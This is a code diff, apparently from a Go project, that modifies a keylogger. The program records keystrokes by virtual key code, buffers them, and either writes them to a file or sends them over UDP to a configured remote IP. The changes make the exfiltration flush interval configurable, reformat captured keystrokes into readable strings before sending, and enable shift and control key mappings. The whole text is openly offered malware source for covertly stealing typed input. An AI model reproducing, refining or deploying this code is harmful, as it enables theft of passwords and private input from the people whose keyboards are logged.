@@ -27,7 +27,7 @@ var codes = map[int]string{
 	0x13: "PAUSE",
 	0x14: "CAPSLOCK",
 	0x1B: "ESC",
-	0x20: "SPACE",
+	0x20: " ",
 	0x21: "PAGEUP",
 	0x22: "PAGEDOWN",
 	0x23: "END",
@@ -125,10 +125,6 @@ var codes = map[int]string{
 	0x87: "F24",
 	0x90: "NUMLOCK",
 	0x91: "SCROLLLOCK",
-	// 0xA0: "LSHIFT",
-	// 0xA1: "RSHIFT",
-	// 0xA2: "LCONTROL",
-	// 0xA3: "RCONTROL",
 	0xA4: "LMENU",
 	0xA5: "RMENU",
 	0xAD: "MUTE",
@@ -162,6 +158,8 @@ type keylogger struct {
 
 	filename string
 	ipdst    string
+
+	flushInterval float64
 }
 
 // information about key events (key presses/up/down)
@@ -227,7 +225,7 @@ func (k *keylogger) start(duration int) {
 
 		}
 
-		if time.Since(lastBufferFlush) > time.Duration(5)*time.Second {
+		if time.Since(lastBufferFlush) > time.Duration(k.flushInterval)*time.Second {
 			if k.mode == 0 {
 				go k.saveToFile(&buffer)
 			} else if k.mode == 1 {
@@ -306,7 +304,11 @@ func (k *keylogger) sendToHost(buffer *[]key, conn *net.UDPConn) {
 	// create string representing the keystrokes from the buffer
 	var dataString string = ""
 	for _, key := range downEvents {
-		dataString += (key.name + " ")
+		if len(key.name) == 1 {
+			dataString += key.name
+		} else {
+			dataString += (" " + key.name + " ")
+		}
 	}
 
 	// resolve ip address
@@ -322,6 +324,10 @@ func (k *keylogger) sendToHost(buffer *[]key, conn *net.UDPConn) {
 	}
 
 	*buffer = nil
+}
+
+func (k *keylogger) setFlushInterval(seconds float64) {
+	k.flushInterval = seconds
 }
 
 // stop running if there is an error
